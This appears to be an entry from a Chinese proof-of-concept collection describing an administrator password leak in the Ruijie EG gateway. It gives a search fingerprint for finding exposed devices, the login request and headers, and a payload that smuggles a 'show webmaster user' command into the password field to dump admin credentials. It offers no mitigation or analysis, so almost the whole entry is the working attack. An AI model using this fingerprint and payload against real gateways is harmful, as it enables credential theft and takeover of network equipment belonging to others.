# 锐捷EG易网关管理员账号密码泄露漏洞

- **系统**：锐捷　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app="Ruijie-EG易网关"`
- **请求**：`POST /login.php HTTP/1.1`
- **关键头**：`Content-Length: 49`　`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
username=admin&password=admin?show+webmaster+user
>
```

**其他**
- 版本: ```java
锐捷EG易网关
```